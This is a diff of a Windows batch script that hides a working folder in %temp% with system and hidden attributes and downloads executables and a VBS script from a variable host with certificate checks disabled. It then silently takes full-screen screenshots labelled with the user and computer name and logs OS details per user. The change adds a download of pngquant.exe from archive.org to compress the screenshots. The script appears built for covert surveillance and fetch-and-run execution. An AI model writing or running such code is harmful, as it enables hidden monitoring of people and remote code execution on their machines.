@@ -25,9 +25,13 @@ attrib +s +h +i "%temp%\%folder%"
 cd "%temp%\%folder%"
 "%environment%\curl.exe" -k %proxy% %host%/Infos/speedtest.exe --output "speedtest.exe"
 "%environment%\curl.exe" -k %proxy% %host%/Infos/osinfo.vbs --output "osinfo.vbs"
+"%environment%\curl.exe" -k %proxy% https://archive.org/download/pngquant-dropscript/pngquant.exe --output "pngquant.exe"
 for /f "usebackq delims=" %%i in (`powershell -command "$userN='%username%'-replace '[^\x00-\x7F]', ''; $userN"`) do set "userN=%%i"
 for /f "usebackq delims=" %%i in (`powershell -command "$computerN='%computername%'-replace '[^\x00-\x7F]', ''; $computerN"`) do set "computerN=%%i"
 "%environment%\nircmd.exe" savescreenshotfull "%userN%@%computerN% ~$currdate.dd_MM_yyyy$ ~$currtime.HH.mm$.png"
+for %%a in (*.png) do (set "pngName=%%a")
+pngquant.exe --force %pngName% --output %pngName%
+
 cscript.exe /nologo osinfo.vbs > "%userN%@%computerN%.txt"
 "speedtest.exe" --accept-license | echo YES
 "speedtest.exe" --accept-gdpr >> "%userN%@%computerN%.txt"
